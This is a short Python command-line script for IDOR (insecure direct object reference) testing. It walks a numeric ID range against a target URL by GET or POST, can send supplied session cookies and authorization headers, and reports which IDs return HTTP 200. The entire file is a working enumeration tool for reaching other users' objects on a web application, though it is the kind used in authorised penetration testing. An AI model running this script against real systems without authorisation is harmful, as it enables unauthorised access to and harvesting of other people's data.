#!/usr/bin/env python3
import requests
import argparse
import time
import json
import sys

def test_idor_range(base_url, param, start_id, end_id, cookies=None, headers=None, method="GET", delay=0.5):
    print(f"[*] Starting IDOR enumeration on {base_url} for parameter '{param}'")
    print(f"[*] Range: {start_id} to {end_id}")

    successful_fetches = []

    for obj_id in range(start_id, end_id + 1):
        url = f"{base_url}?{param}={obj_id}"
        if method == "GET":
            # For GET requests, the parameter is usually in the path or query string
            # If the base_url already contains {} placeholder, use that
            if "{}" in base_url:
                url = base_url.format(obj_id)

        try:
            if method == "GET":
                response = requests.get(url, cookies=cookies, headers=headers, timeout=5)
            elif method == "POST":
                data = {param: obj_id}
                response = requests.post(base_url, data=data, cookies=cookies, headers=headers, timeout=5)

            status_code = response.status_code
            length = len(response.content)

            if status_code == 200:
                print(f"[+] Found ID {obj_id} (Status: {status_code}, Length: {length})")
                successful_fetches.append((obj_id, length))
            elif status_code == 401 or status_code == 403:
                print(f"[-] Access Denied for ID {obj_id} (Status: {status_code})")
            elif status_code == 404:
                print(f"[-] Not Found for ID {obj_id} (Status: {status_code})")
            else:
                print(f"[?] Unexpected status {status_code} for ID {obj_id}")

            time.sleep(delay)

        except requests.RequestException as e:
            print(f"[!] Error testing ID {obj_id}: {e}")

    print("\n[*] Enumeration complete.")
    if successful_fetches:
        print(f"[*] Successfully fetched {len(successful_fetches)} resources.")
        for obj_id, length in successful_fetches:
            print(f"    - ID: {obj_id}, Response Length: {length}")
    else:
        print("[-] No IDOR vulnerabilities found in the specified range.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Basic IDOR Enumeration Script")
    parser.add_argument("-u", "--url", required=True, help="Target Base URL (use {} as placeholder for ID if in path, e.g., http://target.com/api/user/{})")
    parser.add_argument("-p", "--param", help="Target parameter (e.g., id) if using query string/POST data")
    parser.add_argument("-s", "--start", type=int, default=1, help="Start ID")
    parser.add_argument("-e", "--end", type=int, default=100, help="End ID")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP Method")
    parser.add_argument("-c", "--cookies", help="Cookies as JSON string (e.g., '{\"session\": \"12345\"}')")
    parser.add_argument("-H", "--headers", help="Headers as JSON string (e.g., '{\"Authorization\": \"Bearer token\"}')")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests in seconds")

    args = parser.parse_args()

    cookies = json.loads(args.cookies) if args.cookies else None
    headers = json.loads(args.headers) if args.headers else None

    test_idor_range(args.url, args.param, args.start, args.end, cookies, headers, args.method, args.delay)
